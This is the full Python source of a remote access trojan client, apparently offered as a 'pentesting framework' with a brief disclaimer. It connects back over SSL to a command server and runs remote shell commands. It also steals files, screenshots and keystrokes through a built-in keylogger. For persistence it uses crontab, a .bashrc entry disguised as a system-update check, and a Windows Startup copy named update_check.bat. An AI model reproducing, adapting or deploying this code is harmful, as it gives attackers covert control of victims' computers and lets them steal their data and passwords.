#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  HELL SOCIETY RAT - CLIENT (Target Agent)                      ║
║  Created by: HELL SOCIETY Community                              ║
║  Remote Access Tool - Pentesting Framework                       ║
╚══════════════════════════════════════════════════════════════════╝

DISCLAIMER: This tool is for authorized penetration testing only.
Hell Society assumes no liability for misuse.
"""

import socket
import ssl
import json
import os
import sys
import time
import subprocess
import platform
import hashlib
import uuid
import base64
import getpass
import shutil

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    os.system("pip3 install colorama 2>/dev/null || pip install colorama 2>/dev/null")
    try:
        from colorama import init, Fore, Back, Style
        init(autoreset=True)
    except:
        class Fore: RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'
        class Style: BRIGHT='\033[1m'; RESET_ALL='\033[0m'
        def init(**kw): pass

# ═══════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4444
RECONNECT_DELAY = 5
USE_SSL = True
KEYWORDS_FILE = "rat_keylogger.log"

# ═══════════════════════════════════════════════════════════════════
# CLIENT INFO
# ═══════════════════════════════════════════════════════════════════
def get_client_info():
    """Gather system information"""
    try:
        import screeninfo
        monitors = screeninfo.get_monitors()
        screen_info = f"{monitors[0].width}x{monitors[0].height}" if monitors else "unknown"
    except:
        screen_info = "unknown"

    return {
        'id': str(uuid.uuid4())[:8],
        'ip': 'local',
        'port': SERVER_PORT,
        'os': f"{platform.system()} {platform.release()}",
        'username': getpass.getuser(),
        'computer_name': platform.node(),
        'arch': platform.machine(),
        'python': platform.python_version(),
        'screen': screen_info,
        'cwd': os.getcwd(),
    }

# ═══════════════════════════════════════════════════════════════════
# COMMANDS
# ═══════════════════════════════════════════════════════════════════
def cmd_shell(args):
    """Execute shell command"""
    try:
        if platform.system() == "Windows":
            result = subprocess.run(args['cmd'], shell=True, capture_output=True, text=True, timeout=30)
        else:
            result = subprocess.run(args['cmd'], shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        return {'type': 'shell', 'data': output if output else 'No output'}
    except subprocess.TimeoutExpired:
        return {'type': 'error', 'data': 'Command timed out (30s)'}
    except Exception as e:
        return {'type': 'error', 'data': str(e)}

def cmd_ls(args):
    """List directory"""
    path = args.get('path', '.')
    try:
        files = os.listdir(path)
        output = []
        for f in sorted(files):
            full = os.path.join(path, f)
            size = os.path.getsize(full) if os.path.isfile(full) else 0
            ftype = "FILE" if os.path.isfile(full) else "DIR "
            output.append(f"{ftype} {size:>10} {f}")
        return {'type': 'ls', 'data': '\n'.join(output)}
    except Exception as e:
        return {'type': 'error', 'data': str(e)}

def cmd_cd(args):
    """Change directory"""
    try:
        os.chdir(args['path'])
        return {'type': 'cd', 'data': os.getcwd()}
    except Exception as e:
        return {'type': 'error', 'data': str(e)}

def cmd_pwd(args):
    """Current directory"""
    return {'type': 'pwd', 'data': os.getcwd()}

def cmd_screenshot(args):
    """Capture screenshot"""
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        import io
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        data = base64.b64encode(buf.getvalue()).decode()
        return {'type': 'screenshot', 'data': data}
    except ImportError:
        return {'type': 'error', 'data': 'PIL not installed'}
    except Exception as e:
        return {'type': 'error', 'data': str(e)}

def cmd_upload(args):
    """Upload file to target"""
    try:
        file_data = base64.b64decode(args['data'])
        with open(args['path'], 'wb') as f:
            f.write(file_data)
        return {'type': 'upload', 'data': 'ok'}
    except Exception as e:
        return {'type': 'error', 'data': str(e)}

def cmd_download(args):
    """Download file from target"""
    try:
        with open(args['path'], 'rb') as f:
            data = base64.b64encode(f.read()).decode()
        return {'type': 'download', 'data': data}
    except Exception as e:
        return {'type': 'error', 'data': str(e)}

def cmd_process_list(args):
    """List running processes"""
    try:
        if platform.system() == "Windows":
            result = subprocess.run('tasklist', shell=True, capture_output=True, text=True)
        else:
            result = subprocess.run('ps aux', shell=True, capture_output=True, text=True)
        return {'type': 'processes', 'data': result.stdout}
    except Exception as e:
        return {'type': 'error', 'data': str(e)}

def cmd_kill_process(args):
    """Kill process by PID"""
    try:
        pid = int(args['pid'])
        if platform.system() == "Windows":
            os.system(f'taskkill /PID {pid} /F 2>/dev/null')
        else:
            os.kill(pid, 9)
        return {'type': 'kill', 'data': f'Process {pid} killed'}
    except Exception as e:
        return {'type': 'error', 'data': str(e)}

def cmd_keylogger(args):
    """Start/stop keylogger"""
    action = args.get('action', 'start')
    if action == 'start':
        # Simple keylogger using pynput or keyboard
        try:
            import keyboard
            def on_key(e):
                with open(KEYWORDS_FILE, 'a') as f:
                    f.write(f"[{time.strftime('%H:%M:%S')}] {e.name}\n")
            keyboard.on_press(on_key)
            return {'type': 'keylogger', 'data': 'Keylogger started (logging to rat_keylogger.log)'}
        except ImportError:
            return {'type': 'error', 'data': 'pip install keyboard'}
    elif action == 'stop':
        try:
            import keyboard
            keyboard.unhook_all()
            return {'type': 'keylogger', 'data': 'Keylogger stopped'}
        except:
            return {'type': 'error', 'data': 'Could not stop keylogger'}
    elif action == 'read':
        try:
            with open(KEYWORDS_FILE, 'r') as f:
                data = f.read()
            return {'type': 'keylogger', 'data': data}
        except:
            return {'type': 'keylogger', 'data': 'No keys logged yet'}

def cmd_persistence(args):
    """Install persistence mechanism"""
    method = args.get('method', 'all')
    results = []
    
    if method in ('all', 'cron'):
        try:
            # Linux cron persistence
            script_path = os.path.abspath(__file__)
            cron_cmd = f"echo '* * * * * python3 {script_path}' | crontab -"
            os.system(cron_cmd)
            results.append("Cron persistence installed")
        except:
            pass

    if method in ('all', 'startup'):
        try:
            if platform.system() == "Windows":
                startup_dir = os.path.join(os.environ.get('APPDATA', ''), 
                                          'Microsoft/Windows/Start Menu/Programs/Startup')
                shutil.copy2(__file__, os.path.join(startup_dir, 'update_check.bat'))
                results.append("Windows startup persistence installed")
            else:
                # Linux .bashrc persistence
                bashrc = os.path.expanduser('~/.bashrc')
                with open(bashrc, 'r') as f:
                    content = f.read()
                script_path = os.path.abspath(__file__)
                line = f'\n# Check system updates\npython3 {script_path} &>/dev/null &\n'
                if line.strip() not in content:
                    with open(bashrc, 'a') as f:
                        f.write(line)
                results.append("Bashrc persistence installed")
        except:
            pass

    if results:
        return {'type': 'persistence', 'data': '; '.join(results)}
    else:
        return {'type': 'error', 'data': 'No persistence method worked'}

def cmd_system_info(args):
    """Get detailed system info"""
    info = {
        'os': platform.platform(),
        'arch': platform.machine(),
        'hostname': platform.node(),
        'cpu_count': os.cpu_count(),
        'python': platform.python_version(),
        'user': getpass.getuser(),
        'home': os.path.expanduser('~'),
    }
    try:
        import psutil
        info['ram'] = f"{psutil.virtual_memory().total / (1024**3):.1f} GB"
        info['disk'] = f"{psutil.disk_usage('/').total / (1024**3):.1f} GB"
    except:
        pass
    return {'type': 'system_info', 'data': json.dumps(info, indent=2)}

# Command dispatcher
COMMANDS = {
    'shell': cmd_shell,
    'ls': cmd_ls,
    'dir': cmd_ls,
    'cd': cmd_cd,
    'pwd': cmd_pwd,
    'screenshot': cmd_screenshot,
    'upload': cmd_upload,
    'download': cmd_download,
    'process_list': cmd_process_list,
    'ps': cmd_process_list,
    'kill_process': cmd_kill_process,
    'keylogger': cmd_keylogger,
    'persistence': cmd_persistence,
    'persist': cmd_persistence,
    'system_info': cmd_system_info,
}

# ═══════════════════════════════════════════════════════════════════
# MAIN CLIENT
# ═══════════════════════════════════════════════════════════════════
def send_response(conn, response):
    """Send response to server"""
    data = json.dumps(response)
    try:
        conn.sendall(f"{len(data)}:".encode() + data.encode())
    except:
        pass

def receive_command(conn):
    """Receive command from server"""
    try:
        header = b""
        while True:
            chunk = conn.recv(1)
            if not chunk:
                return None
            header += chunk
            if b":" in header:
                break
        
        size = int(header.rstrip(b":"))
        data = b""
        while len(data) < size:
            chunk = conn.recv(min(4096, size - len(data)))
            if not chunk:
                break
            data += chunk
        
        return json.loads(data.decode())
    except:
        return None

def connect_and_run(host, port):
    """Main connection loop"""
    while True:
        try:
            # Connect to server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            if USE_SSL:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock)
            
            sock.settimeout(10)
            sock.connect((host, port))
            
            print(f"[+] Connected to {host}:{port}")
            
            # Send client info
            client_info = get_client_info()
            send_response(sock, {'type': 'init', 'client_info': client_info})
            
            # Main command loop
            while True:
                cmd = receive_command(sock)
                if not cmd:
                    print("[-] Connection lost")
                    break
                
                command = cmd.get('command', '')
                args = cmd.get('args', {})
                
                print(f"[*] Received command: {command}")
                
                if command in COMMANDS:
                    try:
                        response = COMMANDS[command](args)
                    except Exception as e:
                        response = {'type': 'error', 'data': f"Internal error: {e}"}
                else:
                    response = {'type': 'error', 'data': f"Unknown command: {command}"}
                
                send_response(sock, response)
        
        except ConnectionRefusedError:
            print(f"[-] Connection refused to {host}:{port}. Retrying in {RECONNECT_DELAY}s...")
        except Exception as e:
            print(f"[-] Error: {e}. Retrying in {RECONNECT_DELAY}s...")
        
        try:
            time.sleep(RECONNECT_DELAY)
        except KeyboardInterrupt:
            print("[*] Exiting...")
            break

# ═══════════════════════════════════════════════════════════════════
# CLI ARGS
# ═══════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    host = SERVER_HOST
    port = SERVER_PORT

    if len(sys.argv) > 1:
        host = sys.argv[1]
    if len(sys.argv) > 2:
        port = int(sys.argv[2])

    print(f"[*] HELL SOCIETY RAT Client")
    print(f"[*] Connecting to {host}:{port}")
    print(f"[*] Press Ctrl+C to exit")
    print()
    
    connect_and_run(host, port)
